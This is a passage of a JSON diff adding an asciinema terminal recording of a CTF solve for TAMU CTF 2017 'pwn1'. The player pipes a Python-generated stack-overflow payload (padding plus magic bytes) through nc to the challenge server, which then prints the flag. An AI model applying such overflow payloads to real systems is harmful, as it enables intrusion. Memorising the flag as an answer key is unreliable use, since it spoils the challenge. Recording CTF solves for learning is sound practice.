+    ],
+    [
+      0.5,
+      "python -c 'print(\"A\"*27 + \"\\x1E\\xAB\\x11\\xCA\")'"
+    ],
+    [
+      0.5,
+      " "
+    ],
+    [
+      0.5,
+      "|"
+    ],
+    [
+      0.212135,
+      " "
+    ],
+    [
+      0.5,
+      "n"
+    ],
+    [
+      0.134807,
+      "c"
+    ],
+    [
+      0.06601,
+      " "
+    ],
+    [
+      0.5,
+      "p"
+    ],
+    [
+      0.131913,
+      "w"
+    ],
+    [
+      0.068074,
+      "n"
+    ],
+    [
+      0.168028,
+      "."
+    ],
+    [
+      0.181027,
+      "c"
+    ],
+    [
+      0.5,
+      "t"
+    ],
+    [
+      0.288996,
+      "f"
+    ],
+    [
+      0.49147,
+      "."
+    ],
+    [
+      0.312041,
+      "t"
+    ],
+    [
+      0.1109,
+      "a"
+    ],
+    [
+      0.5,
+      "m"
+    ],
+    [
+      0.5,
+      "y"
+    ],
+    [
+      0.5,
+      "."
+    ],
+    [
+      0.5,
+      "e"
+    ],
+    [
+      0.067953,
+      "d"
+    ],
+    [
+      0.064142,
+      "u"
+    ],
+    [
+      0.5,
+      "\b\u001b[K"
+    ],
+    [
+      0.158195,
+      "\b\u001b[K"
+    ],
+    [
+      0.144875,
+      "\b\u001b[K"
+    ],
+    [
+      0.148223,
+      "\b\u001b[K"
+    ],
+    [
+      0.363016,
+      "\b\u001b[K"
+    ],
+    [
+      0.5,
+      "u"
+    ],
+    [
+      0.3261,
+      "."
+    ],
+    [
+      0.5,
+      "e"
+    ],
+    [
+      0.074989,
+      "d"
+    ],
+    [
+      0.045813,
+      "u"
+    ],
+    [
+      0.5,
+      " "
+    ],
+    [
+      0.5,
+      "4"
+    ],
+    [
+      0.106857,
+      "3"
+    ],
+    [
+      0.011791,
+      "2"
+    ],
+    [
+      0.147143,
+      "2"
+    ],
+    [
+      0.261131,
+      "2"
+    ],
+    [
+      0.5,
+      "\b\u001b[K"
+    ],
+    [
+      0.5,
+      "\r\n"
+    ],
+    [
+      0.5,
+      "Enter the secret word:"
+    ],
+    [
+      0.000103,
+      "\r\n"
+    ],
+    [
+      6.9e-05,
+      "How did you figure out my secret?!"
+    ],
+    [
+      0.000174,
+      "\r\n"
+    ],
+    [
+      6.8e-05,
+      "gigem{T00_435Y}"
+    ],
+    [
+      6.6e-05,
+      "\r\n"
+    ],
+    [
+      6.7e-05,
+      "\r\n"
+    ],
+    [
+      0.001197,
+      "\u001b]0;root@kali: ~/CTFs/TamuCtf2017/pwn1\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/CTFs/TamuCtf2017/pwn1\u001b[00m# "
+    ],
+    [
+      0.5,
+      "#"
+    ],
+    [
+      0.414195,
+      "D"
+    ],
+    [
+      0.5,
+      "\b\u001b[K"
+    ],
+    [
+      0.225131,
+      " "
+    ],
+    [
+      0.121877,
+      "d"
+    ],
+    [
+      0.386448,
+      "\b\u001b[K"
+    ],
+    [
+      0.134873,
+      "D"
+    ],
+    [
+      0.108993,
+      "o"
+    ],
+    [
+      0.064009,
+      "n"
+    ],
+    [
+      0.102988,
+      "e"
+    ],
+    [
+      0.257262,
+      "!"
+    ],
+    [
+      0.209365,
+      "\r\n\u001b]0;root@kali: ~/CTFs/TamuCtf2017/pwn1\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/CTFs/TamuCtf2017/pwn1\u001b[00m# "
+    ]
+  ],
+  "command": null,
+  "height": 56,
+  "version": 1,
+  "width": 116,
+  "duration": 88.970504
+}
